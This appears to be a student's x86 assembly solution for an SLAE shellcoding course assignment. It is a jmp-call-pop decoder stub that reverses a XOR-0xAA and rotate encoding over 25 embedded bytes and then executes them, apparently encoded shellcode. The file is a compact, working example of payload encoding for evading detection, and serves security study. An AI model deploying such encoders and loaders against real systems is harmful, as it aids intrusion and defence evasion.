;; SLAE Assignment #4: Decode and Run our ROT7-XOR Encoded Shellcode
;; Website:  http://blog.jsiob.com
;; SLAE-ID: 1400


global _start			

section .text
_start:

	jmp short call_decoder

decoder:

	pop esi						  ; pop shellcode into esi
	xor ecx, ecx				; clear ECX register
	mov cl, 25					; Intiate ECX with the lenght of our shellcode
		

decode:
	xor eax, eax				; clear EAX register
	mov al, byte [esi] 			; move the byte pointed by ESI to EAX
	xor al, 0xaa				; XOR with 0xAA the byte of encoded shellcode 
	ror al, 7 					; Rotate to the right by 7 the byte of the encoded shellcode
	mov byte [esi], al	; move finale result back to our shellcode
	inc esi						  ; move to next byte in esi
	loop decode					; jump back to start of decode
	
	jmp short shellcode


call_decoder:
	call decoder			; pushes shellcode to stack and jumps to decoder_setup
	shellcode: db 0x32,0xca,0x82,0x9e,0x3d,0x3d,0x13,0x9e,0x9e,0x3d,0x9b,0x1e,0x9d,0x6e,0x5b,0x82,0x6e,0xdb,0x03,0x6e,0x5a,0xf2,0x2f,0x4c,0xea
